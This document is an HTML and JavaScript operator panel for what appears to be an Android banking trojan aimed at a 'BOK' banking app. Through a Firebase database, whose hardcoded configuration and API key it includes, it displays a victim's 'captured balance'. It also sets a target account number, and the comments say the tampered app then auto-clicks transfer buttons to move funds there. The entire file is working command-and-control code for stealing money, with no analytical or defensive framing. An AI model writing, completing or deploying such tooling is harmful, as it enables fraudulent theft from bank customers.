<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>BOK System Control v5.0</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <style>
        :root { --bg: #0d1117; --card: #161b22; --primary: #58a6ff; --text: #c9d1d9; }
        body { font-family: 'Segoe UI', sans-serif; background: var(--bg); color: var(--text); padding: 20px; }
        .container { max-width: 800px; margin: auto; }
        .card { background: var(--card); border: 1px solid #30363d; border-radius: 10px; padding: 20px; margin-bottom: 20px; }
        .label { color: #8b949e; font-size: 12px; text-transform: uppercase; }
        .value { font-size: 24px; font-weight: bold; color: #3fb950; font-family: monospace; margin: 10px 0; }
        input[type="text"] { width: 100%; padding: 12px; background: #0d1117; border: 1px solid #30363d; color: white; border-radius: 5px; margin-top: 10px; box-sizing: border-box; }
        button { background: #238636; color: white; border: none; padding: 12px 20px; border-radius: 5px; cursor: pointer; width: 100%; margin-top: 10px; font-weight: bold; }
        button:hover { background: #2ea043; }
    </style>
</head>
<body>

<div class="container">
    <h2>BOK Live Monitor</h2>

    <div class="card">
        <div class="label">Captured Balance (From App)</div>
        <div id="balance_val" class="value">0.00 SDG</div>
    </div>

    <div class="card">
        <h3 style="margin-top:0">Withdrawal Setup</h3>
        <div class="label">Target Account Number (Where money goes)</div>
        <input type="text" id="target_acc" placeholder="Enter Account Number">
        <button onclick="updateTarget()">Set Target & Start Pull</button>
        <p style="font-size: 11px; color: #8b949e; margin-top: 10px;">* When you click, the App will read this number and start auto-clicking "تفاصيل" and "تحويل".</p>
    </div>
</div>

<script>
    // Config from your google-services.json
    const firebaseConfig = {
        apiKey: "AIzaSyAoAfx2voGpTuXh2I-V2XpgOyn5kAM6YIA",
        authDomain: "sudancontrol-c5050.firebaseapp.com",
        databaseURL: "https://sudancontrol-c5050-default-rtdb.firebaseio.com",
        projectId: "sudancontrol-c5050",
        appId: "1:111262781250:android:1b7bebdb45d69df294c2db"
    };

    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    // Listen to Cash (matches SAVED_VALUE_KEY in Smali)
    db.ref('Cash').on('value', (snap) => {
        if(snap.exists()) {
            document.getElementById('balance_val').innerText = snap.val() + " SDG";
        }
    });

    // Function to set the Account (matches hsab() function in Smali)
    function updateTarget() {
        const accNum = document.getElementById('target_acc').value;
        if(accNum === "") return alert("Please enter account number");

        // We push to 'Account' table as the Smali code listens here
        db.ref('Account').set(accNum)
        .then(() => alert("Target Updated! App will now trigger pull."))
        .catch(err => alert("Error: " + err.message));
    }
</script>

</body>
</html>
